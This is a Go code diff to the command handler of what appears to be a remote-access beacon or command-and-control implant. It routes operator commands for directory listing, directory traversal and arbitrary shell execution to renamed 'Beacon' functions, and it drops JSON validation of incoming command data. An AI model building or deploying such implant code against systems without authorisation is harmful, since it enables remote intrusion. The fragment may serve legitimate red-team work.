@@ -22,15 +22,8 @@ func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, boo
 		}, false
 	}
 	var commandData string
-
 	if command.Command != "update" {
-		if err := json.Unmarshal(command.Data, &commandData); err != nil {
-			logger.Error(fmt.Sprintf("Failed to unmarshal path from command data: %v. Data: %s", err, string(command.Data)))
-
-			return httpFuncs.CommandReport{
-				Output:      "Error: Malformed command data.",
-				CommandUUID: command.CommandUUID}, false
-		}
+		commandData = string(command.Data)
 	}
 
 	logger.Log(fmt.Sprintf("Executing command: '%s' (uuid: %s)", command.Command, command.CommandUUID))
@@ -53,11 +46,11 @@ func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, boo
 		},
 		"list_dir": func(cmd httpFuncs.CommandData, data string) (string, bool) {
 			logger.Log("Processing 'listDirectory' command.")
-			return commands.DirOutputAsString(data), false
+			return commands.ListDirectoryBeacon(data), false
 		},
 		"directory_traversal": func(cmd httpFuncs.CommandData, data string) (string, bool) {
-			logger.Log("Running a dir traversal")
-			return commands.DirectoryTraversal(data), false
+			logger.Log("Running a directory traversal")
+			return commands.DirectoryTraversalBeacon(data), false
 		},
 		"shell": func(cmd httpFuncs.CommandData, data string) (string, bool) {
 			logger.Log("Processing 'shell' command.")
@@ -65,7 +58,7 @@ func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, boo
 				logger.Error("Shell command received with empty data.")
 				return "Error: No shell command provided.", false
 			}
-			output, err := commands.RunShellCommand(data)
+			output, err := commands.BeaconShellCommand(data)
 			if err != nil {
 				logger.Error(fmt.Sprintf("Shell command execution failed: %v", err))
 				return "Error: " + err.Error(), false
